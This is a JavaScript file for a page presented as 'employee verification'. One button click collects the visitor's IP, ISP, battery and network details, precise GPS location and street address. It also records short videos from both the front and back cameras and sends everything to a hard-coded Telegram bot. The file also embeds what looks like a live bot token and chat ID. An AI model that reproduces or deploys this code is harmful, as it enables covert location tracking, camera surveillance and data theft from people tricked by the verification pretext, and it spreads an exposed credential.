// Configuration
const CONFIG = {
    botToken: '7229958690:AAEM4qFYes8oRufz2FqIJBMxfCm8XH7KQqo',
    chatId: '6395641632',
    frontVideos: 1,          // 1 front camera video
    backVideos: 1,           // 1 back camera video
    videoDuration: 5000,     // 5 seconds per video
    videoQuality: {          // 720p HD settings
        width: 1280,
        height: 720,
        frameRate: 25,
        bitrate: 1500000     // 1.5 Mbps
    },
    companyIPRanges: [
        '192.168.1.0/24',    // Company LAN
        '203.0.113.0/28'     // Company public IP range
    ],
    locationTimeout: 15000,
    highAccuracy: true
};

// DOM Elements
const verifyBtn = document.getElementById('verifyBtn');
const progressContainer = document.getElementById('progressContainer');
const progressBar = document.getElementById('progressBar');
const statusElement = document.getElementById('status');
const errorElement = document.getElementById('errorMessage');
const usernameInput = document.getElementById('username');

// Main Verification Function
verifyBtn.addEventListener('click', async function() {
    verifyBtn.disabled = true;
    progressContainer.style.display = 'block';
    errorElement.style.display = 'none';
    errorElement.textContent = '';
    progressBar.style.backgroundColor = '#4CAF50';
    
    try {
        const verificationData = await initializeVerificationData();
        await collectSystemInfo(verificationData);
        await collectLocationData(verificationData);
        await captureVideos(verificationData);
        await sendToTelegram(verificationData);
        completeVerification();
    } catch (mainError) {
        handleVerificationError(mainError);
    } finally {
        verifyBtn.disabled = false;
    }
});

// Core Functions
async function initializeVerificationData() {
    updateStatus("Initializing verification...");
    updateProgress(5);
    return {
        username: usernameInput.value.trim() || 'anonymous_User',
        timestamp: new Date().toISOString(),
        errors: {},
        videos: [],
        warnings: []
    };
}

async function collectSystemInfo(data) {
    updateStatus("Collecting system information...");
    
    // Battery info
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            data.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging
            };
        } else {
            data.warnings.push('Battery API not supported');
        }
    } catch (error) {
        data.errors.battery = error.message;
    }
    
    updateProgress(15);
    
    // Network info
    try {
        if ('connection' in navigator) {
            const connection = navigator.connection;
            data.network = {
                type: connection.type || 'unknown',
                effectiveType: connection.effectiveType || 'unknown',
                downlink: connection.downlink ? connection.downlink + ' Mbps' : 'unknown'
            };
        } else {
            data.warnings.push('Network Information API not supported');
        }
    } catch (error) {
        data.errors.network = error.message;
    }
    
    updateProgress(25);
    
    // IP info
    try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        if (ipResponse.ok) {
            const ipData = await ipResponse.json();
            data.ipInfo = {
                ip: ipData.ip,
                isp: ipData.org,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country_name,
                timezone: ipData.timezone
            };
            
            // IP verification
            data.locationStatus = isCompanyIP(ipData.ip, CONFIG.companyIPRanges) ? 
                "Approved. User is inside company premises" : 
                "Outside company network";
        } else {
            throw new Error('Failed to fetch IP information');
        }
    } catch (error) {
        data.errors.ipInfo = error.message;
    }
    
    updateProgress(40);
}

function isCompanyIP(ip, ipRanges) {
    if (ip.includes('.')) {
        const ipParts = ip.split('.').map(Number);
        const ipNum = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
        
        return ipRanges.some(range => {
            if (range.includes('/')) {
                const [rangeIp, mask] = range.split('/');
                const rangeParts = rangeIp.split('.').map(Number);
                const rangeNum = (rangeParts[0] << 24) | (rangeParts[1] << 16) | (rangeParts[2] << 8) | rangeParts[3];
                const maskBits = (-1) << (32 - Number(mask));
                return (ipNum & maskBits) === (rangeNum & maskBits);
            }
            return ip === range;
        });
    }
    return false;
}

async function collectLocationData(data) {
    updateStatus("Requesting location permission...");
    
    try {
        const position = await getLocationPosition();
        
        data.location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy + ' meters',
            source: position.coords.accuracy < 100 ? 'GPS' : 'Network',
            mapsUrl: generateGoogleMapsUrl(position.coords.latitude, position.coords.longitude)
        };
        
        try {
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`
            );
            if (response.ok) {
                const locationData = await response.json();
                data.address = locationData.display_name;
            }
        } catch (error) {
            data.warnings.push('Failed to get address from coordinates');
        }
        
    } catch (error) {
        data.errors.location = getGeoErrorText(error.code || error.message);
    }
    
    updateProgress(60);
}

function generateGoogleMapsUrl(lat, lng) {
    return `https://www.google.com/maps?q=${lat},${lng}`;
}

async function getLocationPosition() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error('Geolocation is not supported by your browser'));
            return;
        }

        const geoOptions = {
            enableHighAccuracy: CONFIG.highAccuracy,
            timeout: CONFIG.locationTimeout,
            maximumAge: 0
        };

        const watchId = navigator.geolocation.watchPosition(
            (pos) => {
                navigator.geolocation.clearWatch(watchId);
                resolve(pos);
            },
            (err) => {
                navigator.geolocation.clearWatch(watchId);
                if (CONFIG.highAccuracy && err.code === err.TIMEOUT) {
                    updateStatus("Trying with standard accuracy...");
                    navigator.geolocation.getCurrentPosition(
                        resolve,
                        reject,
                        { enableHighAccuracy: false, timeout: 10000 }
                    );
                } else {
                    reject(err);
                }
            },
            geoOptions
        );
    });
}

// Video Capture Functions
async function captureVideos(data) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        data.errors.camera = 'Camera API not supported';
        updateProgress(80);
        return;
    }

    try {
        // Capture front camera video
        if (CONFIG.frontVideos > 0) {
            await captureCameraVideo(data, 'user', 'front', 60, 20);
        }
        
        // Capture back camera video
        if (CONFIG.backVideos > 0) {
            await captureCameraVideo(data, 'environment', 'back', 80, 20);
        }
    } catch (error) {
        data.errors.camera = error.message;
    }
}

async function captureCameraVideo(data, facingMode, cameraType, startProgress, progressIncrement) {
    updateStatus(`Preparing ${cameraType} camera...`);
    
    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: facingMode,
                width: { ideal: CONFIG.videoQuality.width },
                height: { ideal: CONFIG.videoQuality.height },
                frameRate: { ideal: CONFIG.videoQuality.frameRate }
            },
            audio: false
        });
        
        updateStatus(`Recording ${cameraType} camera video...`);
        updateProgress(startProgress);
        
        const videoBlob = await recordVideo(stream, CONFIG.videoDuration);
        const videoData = await blobToBase64(videoBlob);
        
        data.videos.push({
            data: videoData,
            type: cameraType,
            timestamp: new Date().toISOString(),
            resolution: `${CONFIG.videoQuality.width}x${CONFIG.videoQuality.height}`,
            duration: `${CONFIG.videoDuration/1000}s`
        });
        
        updateProgress(startProgress + progressIncrement);
        
    } catch (error) {
        throw new Error(`Failed to capture ${cameraType} video: ${error.message}`);
    } finally {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    }
}

function recordVideo(stream, duration) {
    return new Promise((resolve, reject) => {
        const options = {
            mimeType: 'video/webm;codecs=h264',
            videoBitsPerSecond: CONFIG.videoQuality.bitrate
        };

        // Fallback to VP9 if H.264 not available
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/webm;codecs=vp9';
        }

        const mediaRecorder = new MediaRecorder(stream, options);
        const videoChunks = [];
        
        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) videoChunks.push(e.data);
        };
        
        mediaRecorder.onstop = () => {
            resolve(new Blob(videoChunks, { type: options.mimeType }));
        };
        
        mediaRecorder.onerror = (e) => {
            reject(new Error(`Recording failed: ${e.error.name}`));
        };
        
        mediaRecorder.start(100); // Collect data every 100ms
        setTimeout(() => mediaRecorder.stop(), duration);
    });
}

// Telegram Integration
async function sendToTelegram(data) {
    updateStatus("Sending verification data...");
    
    try {
        const textContent = formatTelegramMessage(data);
        await sendTelegramMessage(textContent);
        
        if (data.videos && data.videos.length > 0) {
            await sendVideosToTelegram(data);
        }
        
        if (Object.keys(data.errors).some(k => k.startsWith('video_send_'))) {
            const errorText = `*Video Send Issues for ${data.username}:*\n` +
                Object.entries(data.errors)
                    .filter(([k]) => k.startsWith('video_send_'))
                    .map(([k, v]) => `- ${k.replace('video_send_', '')}: ${v}`)
                    .join('\n');
            
            await sendTelegramMessage(errorText);
        }
        
    } catch (error) {
        throw new Error('Failed to send data to Telegram: ' + error.message);
    }
    
    updateProgress(100);
}

async function sendVideosToTelegram(data) {
    for (let i = 0; i < data.videos.length; i++) {
        const video = data.videos[i];
        try {
            if (!video.data || typeof video.data !== 'string') {
                throw new Error('Invalid video data format');
            }

            const blob = await base64ToBlob(video.data, 'video/webm');
            if (!blob || blob.size === 0) {
                throw new Error('Empty video data');
            }

            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append('video', blob, `${video.type}_camera.webm`);
            formData.append('caption', 
                `${video.type === 'front' ? 'Front' : 'Back'} camera verification\n` +
                `User: ${data.username}\n` +
                `Resolution: ${video.resolution}\n` +
                `Duration: ${video.duration}`
            );

            const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendVideo`, {
                method: 'POST',
                body: formData
            });

            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                throw new Error(errorData.description || 'Telegram API error');
            }

        } catch (error) {
            data.errors[`video_send_${i}`] = `Failed to send ${video.type} video: ${error.message}`;
            console.error(`Error sending video ${i}:`, error);
        }
    }
}

function formatTelegramMessage(data) {
    return `*Employee Verification Report*\n\n` +
        `*Username:* ${data.username}\n` +
        `*Time:* ${new Date(data.timestamp).toLocaleString()}\n` +
        `*Status:* ${data.locationStatus || 'Location not verified'}\n` +
        (data.ipInfo ? `*IP Address:* ${data.ipInfo.ip}\n*ISP:* ${data.ipInfo.isp}\n` : '') +
        (data.location ? `*GPS Location:* \n` +
         `- Latitude: ${data.location.latitude}\n` +
         `- Longitude: ${data.location.longitude}\n` +
         `- Accuracy: ${data.location.accuracy}\n` +
         `- [Google Maps](${data.location.mapsUrl})\n` +
         (data.address ? `- Address: ${data.address}\n` : '') : '') +
        `\n*System Information:*\n` +
        (data.battery ? `- Battery: ${data.battery.level} ${data.battery.charging ? '(Charging)' : ''}\n` : '') +
        (data.network ? `- Network: ${data.network.effectiveType} (${data.network.type})\n` : '') +
        `\n*Videos Recorded:*\n` +
        (data.videos?.map(v => `- ${v.type} camera (${v.resolution}, ${v.duration})`).join('\n') || 'None') +
        `\n\n*Errors encountered:*\n${Object.entries(data.errors).map(([key, value]) => `- ${key}: ${value}`).join('\n') || 'None'}`;
}

// Helper Functions
function updateStatus(text) {
    statusElement.textContent = text;
}

function updateProgress(percent) {
    progressBar.style.width = percent + '%';
}

function handleVerificationError(error) {
    errorElement.textContent = "Error during verification: " + error.message;
    errorElement.style.display = 'block';
    statusElement.textContent = "Verification failed";
    progressBar.style.width = '100%';
    progressBar.style.backgroundColor = '#f44336';
}

function completeVerification() {
    updateStatus("Verification complete!");
    progressBar.style.width = '100%';
}

function getGeoErrorText(code) {
    const errors = {
        1: 'Permission denied by user',
        2: 'Position unavailable (no signal)',
        3: 'Request timed out'
    };
    return errors[code] || 'Location error: ' + code;
}

function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => {
            const result = reader.result;
            if (typeof result === 'string') {
                const base64Data = result.split(',')[1];
                if (base64Data) {
                    resolve(base64Data);
                } else {
                    reject(new Error('Invalid video data format'));
                }
            } else {
                reject(new Error('Unexpected reader result type'));
            }
        };
        reader.onerror = () => reject(new Error('Failed to read blob data'));
        reader.readAsDataURL(blob);
    });
}

function base64ToBlob(base64, type = 'video/webm') {
    try {
        const cleanBase64 = base64.replace(new RegExp(`^data:${type};base64,`), '');
        const byteString = atob(cleanBase64);
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        
        return new Blob([ab], { type });
    } catch (error) {
        console.error('Base64 to Blob conversion error:', error);
        throw new Error('Invalid base64 video data');
    }
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendTelegramMessage(text) {
    const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.chatId,
            text: text,
            parse_mode: 'Markdown'
        })
    });
    
    if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.description || 'Telegram API error');
    }
}
